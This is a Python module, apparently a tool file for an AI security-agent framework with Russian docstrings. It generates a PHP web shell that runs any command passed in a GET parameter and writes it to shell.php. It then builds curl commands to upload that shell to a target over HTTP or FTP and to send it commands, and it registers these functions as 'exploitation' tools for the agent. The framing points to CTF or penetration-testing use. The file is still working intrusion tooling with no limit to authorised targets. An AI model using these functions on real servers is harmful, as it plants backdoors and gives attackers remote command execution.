"""
PHP-вебшелл и утилиты curl для эксплуатации веб-приложений
"""


def generate_php_webshell(target_url=None, port=None, protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Загружает и генерирует базовый PHP-вебшелл, отправляя его через HTTP или FTP

    Аргументы:
        target_url: Целевой URL для загрузки шелла
        port: Номер порта (по умолчанию: 80 для HTTP, 21 для FTP)
        protocol: Используемый протокол — 'http' или 'ftp' (по умолчанию: http)
        ctf: Объект CTF для использования в контексте

    Возвращает:
        Кортеж из (содержимое вебшелла, команда загрузки)
    """
    with open("shell.php", "w", encoding="utf-8") as f:
        f.write("""<?php system($_GET['cmd']); ?>""")
    webshell = """<?php system($_GET['cmd']); ?>"""

    if not target_url:
        return webshell

    if not port:
        port = 21 if protocol == "ftp" else 80

    if protocol == "ftp":
        upload_cmd = f"curl -T shell.php ftp://{target_url}:{port}/"
    else:
        # Загрузка через HTTP POST
        upload_cmd = f"curl -X POST http://{target_url}:{port} -F 'file=@shell.php'"

    return webshell, upload_cmd


def curl_webshell(url, command, cmd_param="cmd"):
    """
    Отправляет команду в PHP-вебшелл через curl

    Аргументы:
        url: URL вебшелла
        command: Команда для выполнения
        cmd_param: Имя GET-параметра для команды (по умолчанию: cmd)

    Возвращает:
        Команда для выполнения через curl
    """
    encoded_cmd = command.replace(" ", "+")
    return f"curl '{url}?{cmd_param}={encoded_cmd}'"


def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Генерирует команду curl для загрузки PHP-вебшелла

    Аргументы:
        url: Целевой URL для загрузки
        filename: Имя файла шелла (по умолчанию: shell.php)
        ctf: Объект CTF для использования в контексте

    Возвращает:
        Кортеж из (содержимое вебшелла, команда загрузки curl)
    """
    shell = generate_php_webshell()
    curl_cmd = f"""curl -X POST {url} -F "file=@{filename}" """
    return shell, curl_cmd


# --- Автоматическая регистрация в ToolRegistry ---
from cai.tool_registry import TOOL_REGISTRY  # noqa: E402
TOOL_REGISTRY.register("generate_php_webshell", generate_php_webshell, categories=['web', 'exploitation'])
TOOL_REGISTRY.register("curl_webshell", curl_webshell, categories=['web', 'exploitation'])
TOOL_REGISTRY.register("upload_webshell", upload_webshell, categories=['web', 'exploitation'])
